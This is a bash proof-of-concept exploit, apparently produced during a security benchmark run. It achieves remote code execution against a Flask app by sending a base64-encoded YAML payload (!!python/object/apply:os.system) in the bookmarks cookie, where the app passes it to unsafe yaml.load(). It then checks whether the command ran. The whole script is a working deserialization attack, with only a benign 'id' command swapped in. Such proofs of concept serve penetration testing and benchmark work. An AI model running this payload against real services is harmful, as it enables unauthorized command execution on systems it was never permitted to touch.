#!/bin/bash
# POC: Demonstrates RCE via YAML deserialization in bookmarks cookie using Python's unsafe yaml.load(). Executes arbitrary system commands through crafted YAML payload.
# Target: ./repo
# Created: 2025-12-01T15:45:33.478Z
# Session: benchmark-XBEN-075-24-minbd1zc

# YAML Deserialization RCE POC
# Target: Flask application with unsafe yaml.load() in bookmarks cookie
# Vulnerability: YAML deserialization allows arbitrary code execution

# Configuration
TARGET_URL="${TARGET_URL:-http://localhost:5000}"
OUTPUT_FILE="/tmp/rce_output_$(date +%s).txt"
COMMAND="id > ${OUTPUT_FILE}"

echo "[*] YAML Deserialization RCE POC"
echo "[*] Target: ${TARGET_URL}"
echo "[*] Command to execute: ${COMMAND}"
echo ""

# Step 1: Create malicious YAML payload
# Using !!python/object/apply:os.system to execute arbitrary commands
YAML_PAYLOAD="- !!python/object/apply:os.system
  args: [\"${COMMAND}\"]"

echo "[+] Step 1: Creating malicious YAML payload"
echo "[*] Payload:"
echo "$YAML_PAYLOAD"
echo ""

# Step 2: Base64 encode the payload
ENCODED_PAYLOAD=$(echo -n "$YAML_PAYLOAD" | base64 -w 0)
echo "[+] Step 2: Base64 encoding payload"
echo "[*] Encoded: $ENCODED_PAYLOAD"
echo ""

# Step 3: Send payload via bookmarks cookie to /list endpoint
echo "[+] Step 3: Sending malicious payload via /list endpoint"
RESPONSE=$(curl -s "${TARGET_URL}/list" \
  -H "Cookie: bookmarks=${ENCODED_PAYLOAD}; user=test_user" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status: $HTTP_CODE"
echo "[*] Response length: $(echo "$BODY" | wc -c) bytes"
echo ""

# Step 4: Verify command execution by checking output file
echo "[+] Step 4: Verifying command execution"
sleep 1

if [ -f "$OUTPUT_FILE" ]; then
    echo "[✓] SUCCESS: Command executed!"
    echo "[*] Output file: $OUTPUT_FILE"
    echo "[*] Output contents:"
    cat "$OUTPUT_FILE"
    echo ""
    exit 0
else
    echo "[✗] FAILED: Output file not created"
    echo "[*] Expected file: $OUTPUT_FILE"
    exit 1
fi